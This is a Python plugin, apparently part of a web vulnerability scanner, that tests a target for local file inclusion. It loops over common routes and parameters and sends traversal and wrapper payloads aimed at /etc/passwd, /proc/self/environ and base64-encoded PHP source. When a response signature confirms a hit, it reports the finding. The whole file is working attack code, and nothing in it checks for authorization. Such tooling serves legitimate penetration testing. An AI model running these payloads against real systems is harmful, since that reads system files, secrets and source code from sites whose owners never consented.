#!/usr/bin/env python3
"""Plugin LFI: inclusion de archivos locales con confirmacion por firma real."""
LFI_ROUTES = ["", "/file", "/page", "/index.php", "/view", "/download", "/read", "/doc"]
LFI_PARAMS = ["file", "page", "path", "inc", "include", "lang", "doc", "view", "template", "img"]
LFI_PAYLOADS = ["/etc/passwd", "../../../../../../etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "....//....//....//etc/passwd", "/proc/self/environ"]


def run(ctx):
    from engine import confirm_lfi
    target = ctx.target
    hits = []
    for rt in LFI_ROUTES:
        base_url = target.rstrip("/") + rt
        for param in LFI_PARAMS:
            if ctx.ctrl("lfi") in ("stop", "skip"):
                break
            for p in LFI_PAYLOADS:
                if ctx.ctrl("lfi") in ("stop", "skip"):
                    break
                rr = ctx.req("GET", base_url, {param: p})
                if rr.get("code") == 200:
                    sig = confirm_lfi(rr.get("body", ""), p)
                    if sig:
                        hits.append(f"{rt or '/'}{param}={p} ({sig})")
                        ctx.emit({"type": "finding", "severity": "high", "module": "lfi",
                                  "detail": f"LFI confirmada en '{base_url}' param '{param}' con: {p} (firma: {sig})",
                                  "evidence": {"url": base_url, "param": param, "payload": p}})
                        break
    ctx.emit({"type": "module", "name": "lfi", "status": "done",
              "msg": f"LFI: {len(hits)} confirmada(s)", "findings": hits})
